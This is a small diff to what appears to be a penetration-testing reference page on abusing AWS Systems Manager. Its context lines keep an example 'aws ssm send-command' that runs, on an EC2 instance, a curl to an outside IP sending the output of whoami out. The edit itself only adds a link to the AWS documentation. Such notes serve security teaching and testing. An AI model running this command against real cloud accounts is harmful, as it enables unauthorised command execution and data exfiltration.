@@ -23,7 +23,6 @@ e.g:
 $ aws ssm send-command --instance-ids "i-05b████████adaa" --document-name "AWS-RunShellScript" --comment "whoami" --parameters commands='curl 162.243.███.███:8080/`whoami`' --output text --region=us-east-1
 ```
 
-
 ## References
 
-* []()
+* [What is AWS Systems Manager? - AWS](https://docs.aws.amazon.com/systems-manager/latest/userguide/what-is-systems-manager.html)
